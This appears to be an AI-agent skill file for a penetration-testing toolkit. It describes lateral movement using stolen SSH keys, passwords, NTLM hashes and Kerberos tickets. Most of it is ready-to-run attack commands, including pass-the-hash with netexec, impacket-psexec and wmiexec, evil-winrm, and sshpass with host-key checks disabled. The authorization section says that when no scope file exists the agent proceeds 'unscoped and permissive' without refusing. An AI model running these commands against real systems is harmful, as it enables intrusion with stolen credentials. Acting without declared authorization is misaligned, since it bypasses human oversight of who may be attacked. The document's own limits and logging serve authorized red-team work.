---
name: lateral-movement
description: "Authorized pivot from one compromised host to another using credentials, hashes, or SSH keys recovered by credential-harvest. Connect-and-confirm only — `ssh` with stolen key or password, `netexec` SMB / WinRM auth, `impacket-psexec` / `impacket-wmiexec`. One successful auth per target host; no spraying, no relay, no recursive auto-pivot, no persistence."
version: 0.1.0
license: Apache-2.0
author: Scarlight contributors
platforms: [linux, macos]
prerequisites:
  commands: [ssh, sshpass, netexec, impacket-psexec, impacket-wmiexec, jq]
metadata:
  scarlight:
    tags: [lateral-movement, pivot, psexec, wmiexec, ssh, post-exploitation, offensive]
    phase: lateral-movement
    related_skills: [credential-harvest, service-exploit, recon, privesc-linux, privesc-windows]
    risk_level: destructive
---

# Lateral-movement — pivot to a second authorized host

Use credentials, hashes, or keys recovered by [`credential-harvest`](../credential-harvest/SKILL.md) to authenticate to a second host inside the engagement scope and confirm access. Connect-and-confirm only: the skill establishes that the credential is valid, captures a tiny proof-of-access (`id`, `hostname`, `whoami`), audit-logs the pivot, and exits. It does NOT hold an interactive session, does NOT chain to a third host on its own, and does NOT install persistence.

This skill is **`destructive`** — see [`CONVENTIONS.md`](../CONVENTIONS.md) §1. Reusing harvested credentials against a second host is, in many engagement contracts, a separately-scoped action. The skill body re-validates that the pivot target is explicitly authorized.

## When to use

- [`credential-harvest`](../credential-harvest/SKILL.md) recovered material that maps to a service on a second host:
  - SSH private key in `~/.ssh/id_rsa` + a hostname in `~/.ssh/config` or `~/.ssh/known_hosts` → SSH pivot
  - SSH password in `.bash_history`, `notes.txt`, environment, or memory → SSH pivot via `sshpass`
  - NTLM hash from `secretsdump` SAM/LSA → SMB / WinRM auth via pass-the-hash
  - Plaintext domain credential from `mimikatz logonpasswords` → SMB / WMI / WinRM auth
  - Kerberos TGT (`.kirbi`) → pass-the-ticket SMB auth
- The second host (`$PIVOT_HOST`) is **explicitly listed in `engagement.yaml`'s `targets:`**. A compromise on host A does not extend scope to host B by implication.
- The operator wants a proof-of-access on the pivot host, not a fishing expedition. If the goal is "see what creds work on every host on the subnet," that's password spraying — out of v1.1 (see §7).

If credentials match a service on a host outside scope, **stop** and surface the finding. The pivot is a finding in itself.

## Hard prerequisite — authorization

Refer to [`CODE_OF_USE.md`](../../CODE_OF_USE.md) — Scarlight is for authorized engagements only. The engagement-scope guard is a first measure, not a substitute for the operator's legal responsibility. Engagements are **opt-in**: when an `engagement.yaml` is active its `targets:` list is enforced (and re-checked at skill entry as defense in depth); when **none** is declared the session runs **unscoped and permissive** — proceed with the task, do not demand a scope file or refuse for lack of one, and treat the operator as responsible under the policy above.

- `$PIVOT_HOST` MUST appear in `engagement.yaml`'s `targets:` list. Re-check at skill entry (defense in depth — see [`CONVENTIONS.md`](../CONVENTIONS.md) §2). The per-tool gate inspects the immediate shell command (`ssh user@host`, `netexec smb host -u ... -p ...`), but a target supplied via a `-targets-file` or env-var substitution can slip past — the skill body re-validates.
- **Per-host operator authorization is the unit.** Authorization to pivot from A to B does not authorize A to C, and does not authorize B to its own neighbors. Recursive auto-pivot is refused (§7).
- Under `--no-scope`, refuse pivots to any IP outside RFC1918 / `127.0.0.0/8` / local-lab TLDs (`.htb`, `.thm`, `.lab`, `.test`, `.local`). Print the [`CONVENTIONS.md`](../CONVENTIONS.md) §9 banner before the first auth attempt.

## Procedure

`$PIVOT_HOST` is the second host, `$CRED_ORIGIN` is the credential-harvest source string (e.g. `mimikatz_logonpasswords`, `chrome_sqlite`, `bash_history`), `$WORK="lateral-movement/$PIVOT_HOST-$(date -u +%s)"`. `mkdir -p "$WORK"`.

### Audit-log helper + scope precondition

Copy the canonical `audit_log` bash function from [`CONVENTIONS.md`](../CONVENTIONS.md) §3 verbatim into the script. Then:

```bash
# Authorization precondition — see CONVENTIONS.md §2.
if [ -z "$PIVOT_HOST" ]; then
  echo "[lateral-movement] refused: no PIVOT_HOST supplied" >&2
  exit 2
fi

if [ -n "${SCARLIGHT_ENGAGEMENT_ID:-}" ]; then
  : "${SCARLIGHT_SCOPE_REF:?engagement loaded but scope_ref missing}"
fi

# --no-scope banner (CONVENTIONS.md §9)
no_scope_banner
```

### 1. SSH pivot — stolen key

```bash
# Stolen private key recovered by credential-harvest.
# StrictHostKeyChecking=no — pivot targets in a lab/CTF/red-team engagement
# rarely have known_hosts entries; the operator accepts the resulting
# MITM risk by listing the pivot host in engagement.yaml.
ssh \
  -i "$STOLEN_KEY_PATH" \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o ConnectTimeout=10 \
  -o BatchMode=yes \
  -o PasswordAuthentication=no \
  "$PIVOT_USER@$PIVOT_HOST" \
  'id; hostname; uname -a; cat /etc/os-release 2>/dev/null | head -5' \
  2>&1 | tee "$WORK/ssh-proof.txt"

audit_log "lateral-movement" "$PIVOT_HOST" \
  "ssh -i stolen_key $PIVOT_USER@$PIVOT_HOST (origin: $CRED_ORIGIN)" \
  "$([ $? -eq 0 ] && echo success || echo error)"
```

Stop after the proof command returns. **Do not** hold an interactive session, do not start a port-forward (`ssh -L`), do not pull a backdoor public key into `~/.ssh/authorized_keys` on the pivot host.

### 2. SSH pivot — stolen password

```bash
# Stolen plaintext password. sshpass is in the Kali image; if absent, fall
# back to printing the credential and asking the operator to dispatch
# manually (do NOT echo the password into ssh's stdin from a script).
sshpass -p "$STOLEN_PASSWORD" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o ConnectTimeout=10 \
  -o PreferredAuthentications=password \
  -o PubkeyAuthentication=no \
  "$PIVOT_USER@$PIVOT_HOST" \
  'id; hostname; uname -a' \
  2>&1 | tee "$WORK/ssh-password-proof.txt"

audit_log "lateral-movement" "$PIVOT_HOST" \
  "sshpass ssh $PIVOT_USER@$PIVOT_HOST (origin: $CRED_ORIGIN)" \
  "$([ $? -eq 0 ] && echo success || echo error)"
```

`sshpass` is rate-light — the skill makes a single attempt per target. Multiple-password rotation against a single target is bruteforcing, not lateral movement (`password-attack` territory).

### 3. SMB pivot — `netexec`

```bash
# Cleartext credential
netexec smb "$PIVOT_HOST" \
  -u "$PIVOT_USER" \
  -p "$STOLEN_PASSWORD" \
  --shares \
  2>&1 | tee "$WORK/netexec-smb.txt"

# Pass-the-hash (NTLM)
netexec smb "$PIVOT_HOST" \
  -u "$PIVOT_USER" \
  -H "$NTLM_HASH" \
  --shares \
  2>&1 | tee "$WORK/netexec-smb-pth.txt"

# Local-admin check (informational — does NOT auto-execute commands)
netexec smb "$PIVOT_HOST" \
  -u "$PIVOT_USER" \
  -H "$NTLM_HASH" \
  --local-auth \
  2>&1 | tee "$WORK/netexec-smb-localadmin.txt"

audit_log "lateral-movement" "$PIVOT_HOST" \
  "netexec smb (auth check + share enum, origin: $CRED_ORIGIN)" \
  "success"
```

`netexec` is the maintained fork of `crackmapexec`. One target at a time — `$PIVOT_HOST` is a single host, never a CIDR range and never a `-targets-file`. CIDR scans are password spraying, which is out of v1.1 (§7).

If `netexec` is missing from the Kali image, fall back to `crackmapexec` with identical flags; if both are missing, the agent should `apt-get install -y --no-install-recommends netexec` (per [`CONVENTIONS.md`](../CONVENTIONS.md) §11) before continuing.

### 4. Command execution on the pivot host — `impacket-psexec` / `impacket-wmiexec`

Once `netexec` confirms local-admin, a **single** command-execution attempt is in scope to prove RCE on the pivot. Multi-command interactive shell is out of v1.1.

```bash
# psexec (uploads a service binary; loud, registers in event log)
impacket-psexec \
  "$PIVOT_USER:$STOLEN_PASSWORD@$PIVOT_HOST" \
  -codec utf-8 \
  -c "whoami; hostname" \
  2>&1 | tee "$WORK/psexec-proof.txt"

# Pass-the-hash variant
impacket-psexec \
  -hashes ":$NTLM_HASH" \
  "$PIVOT_USER@$PIVOT_HOST" \
  -codec utf-8 \
  -c "whoami; hostname" \
  2>&1 | tee "$WORK/psexec-pth-proof.txt"

# wmiexec (no service install — quieter)
impacket-wmiexec \
  "$PIVOT_USER:$STOLEN_PASSWORD@$PIVOT_HOST" \
  "whoami /all" \
  2>&1 | tee "$WORK/wmiexec-proof.txt"

audit_log "lateral-movement" "$PIVOT_HOST" \
  "impacket-{psexec,wmiexec} single-command proof (origin: $CRED_ORIGIN)" \
  "success"
```

`impacket-psexec` defaults to running an interactive cmd shell. The `-c "<command>"` flag enforces one-shot mode. Do NOT remove `-c`.

### 5. WinRM pivot — `evil-winrm`

`evil-winrm` is not bundled in the base Kali image; the skill body should attempt `apt-get install -y --no-install-recommends evil-winrm` once before falling back.

```bash
# WinRM cleartext
evil-winrm -i "$PIVOT_HOST" -u "$PIVOT_USER" -p "$STOLEN_PASSWORD" \
  -e "/dev/null" \
  <<< 'id; hostname; exit' \
  2>&1 | tee "$WORK/winrm-proof.txt"

# Pass-the-hash
evil-winrm -i "$PIVOT_HOST" -u "$PIVOT_USER" -H "$NTLM_HASH" \
  <<< 'id; hostname; exit' \
  2>&1 | tee "$WORK/winrm-pth-proof.txt"

audit_log "lateral-movement" "$PIVOT_HOST" \
  "evil-winrm single-command (origin: $CRED_ORIGIN)" \
  "success"
```

If `evil-winrm` install fails, `netexec winrm` is the fallback path:

```bash
netexec winrm "$PIVOT_HOST" \
  -u "$PIVOT_USER" \
  -p "$STOLEN_PASSWORD" \
  -x 'whoami; hostname' \
  2>&1 | tee "$WORK/netexec-winrm.txt"
```

### 6. Kerberos pass-the-ticket (advanced)

If [`credential-harvest`](../credential-harvest/SKILL.md) exported `.kirbi` tickets, `impacket-psexec` and `impacket-wmiexec` accept `-k -no-pass` with the ticket file pre-loaded via `KRB5CCNAME`:

```bash
# Convert .kirbi → .ccache once
impacket-ticketConverter "$WORK/ticket.kirbi" "$WORK/ticket.ccache"
export KRB5CCNAME="$WORK/ticket.ccache"

impacket-psexec -k -no-pass "$DOMAIN/$PIVOT_USER@$PIVOT_HOST.fqdn" \
  -c "whoami" \
  2>&1 | tee "$WORK/ppt-proof.txt"

audit_log "lateral-movement" "$PIVOT_HOST" \
  "pass-the-ticket impacket-psexec (origin: $CRED_ORIGIN)" \
  "success"
```

Kerberos pivots require the pivot host's **FQDN** (the SPN is bound to the DNS name, not the IP). If only the IP is known, the skill body asks the operator and stops, rather than guessing.

## Stop conditions

Per [`CONVENTIONS.md`](../CONVENTIONS.md) §4:

| Tool | Stop convention |
|---|---|
| `ssh` | `ConnectTimeout=10`, `BatchMode=yes` (no password prompts), single proof command then exit |
| `sshpass` | One attempt per target — repeat = bruteforce |
| `netexec` / `crackmapexec` | One target host per invocation (no CIDR, no `--targets-file`) |
| `impacket-psexec` / `wmiexec` | One-shot mode (`-c "<command>"`), single command per target |
| `evil-winrm` | Single heredoc command, immediate `exit` |
| Total cap | One successful auth per pivot host per run. Re-running re-confirms only. |

## Idempotency

Re-running against the same pivot host with the same credential produces equivalent output — the proof file is overwritten, the audit log gains one new entry per invocation. The skill body does NOT cache "I already pivoted here" because re-confirming is the cheapest way to detect the operator revoking the credential mid-engagement.

## Findings record

Update the memory record per [`CONVENTIONS.md`](../CONVENTIONS.md) §7 with a new `lateral_movement[]` subtree (extends the v1 schema):

```json
{
  "lateral_movement": [
    {
      "source_host": "10.10.10.5",
      "target_host": "10.10.10.20",
      "mechanism": "ssh-stolen-key | ssh-stolen-password | smb-ntlm | smb-pth | wmiexec | psexec | winrm | psn-pth-ticket",
      "credential_origin": "credential-harvest/mimikatz_logonpasswords | bash_history | chrome_sqlite | ...",
      "user": "DOMAIN\\Administrator",
      "proof": "id=uid=0(root) hostname=pivot-02 ...",
      "captured_at": "2026-05-19T14:32:01Z",
      "success": true
    }
  ]
}
```

Subtree owner: `lateral-movement` (sole owner).

## Hand-off

| Outcome | Next skill |
|---|---|
| Pivot succeeded, pivot host has its own credential store | [`credential-harvest`](../credential-harvest/SKILL.md) (on the pivot host's compromised-shell context, NOT recursively pivoting onward) |
| Pivot succeeded, pivot host has unpatched services | [`service-exploit`](../service-exploit/SKILL.md) (treat pivot host as a fresh recon target) |
| Pivot host is a Windows machine, operator wants privesc | [`privesc-windows`](../privesc-windows/SKILL.md) on the pivot host's shell |
| Pivot host is a Linux machine, operator wants privesc | [`privesc-linux`](../privesc-linux/SKILL.md) on the pivot host's shell |
| Hashes that DIDN'T auth on the pivot — but might crack | [`password-attack`](../password-attack/SKILL.md) (offline) |
| A NEW pivot target (B → C) appears | **STOP** and surface the finding. C requires fresh operator authorization — DO NOT auto-chain. |

## What this skill is NOT for

- **Password spraying** — one credential against many hosts is a separate, scope-sensitive activity. Out of v1.1; future `password-spray` skill with explicit per-CIDR authorization.
- **NTLM relay / `responder` / `ntlmrelayx.py`** — requires MITM positioning on the network, separate substrate. Out of v1.1.
- **Recursive auto-pivot (B → C → D)** — every new pivot target requires its own per-target authorization. The agent surfaces the finding and stops; the operator decides.
- **Domain Controller targeting without explicit DA acknowledgment** — DCSync, replication-permission grants, DC-hosted credential extraction are [`credential-harvest`](../credential-harvest/SKILL.md) §2 territory with its own `permitted_risk_level: destructive` gate. The lateral-movement skill auths *to* a DC (single command-exec proof); it does NOT dump NTDS — that's `credential-harvest`'s job under its own authorization.
- **Persistence on the pivot host** — no `authorized_keys` plants, no scheduled tasks, no service installs left running, no Run-key registry writes. `specs/exploitation-v1/requirements.md` §6 + every v1.1 skill's non-goals.
- **Interactive shell sessions held open across turns** — Scarlight has no session-management substrate yet. The skill establishes auth, captures proof, exits. Future `lateral-movement-session` skill in v1.2+ when the substrate lands.
- **Port-forwarding / SOCKS proxy chains** — `ssh -L` / `ssh -D` / `chisel` are pivot infrastructure, separate substrate. Out of v1.1.
- **EDR / AV evasion** — `evil-winrm` is detected by mainstream EDR. If quarantined, surface that and stop — do NOT respond with obfuscated variants. `specs/exploitation-v1/requirements.md` §6 deferral.
- **Targets not in the active engagement scope** — refuse, don't auth.
- **OT / ICS / medical-device hosts** — `specs/mission.md` non-goal.
- **Autonomous 0-day exploitation** — `specs/mission.md` non-goal.

## References

- [`CONVENTIONS.md`](../CONVENTIONS.md) — risk_level, audit-log helper, stop conditions, scope re-validation, sandbox-by-default, `--no-scope` banner, authorized-use anchor.
- [`specs/exploitation-v1/requirements.md`](../../specs/exploitation-v1/requirements.md) §7.1 — was a v1.2 deferral; pulled forward into v1.1 for connect-and-confirm scope only.
- [`CODE_OF_USE.md`](../../CODE_OF_USE.md) — authorized-use policy.
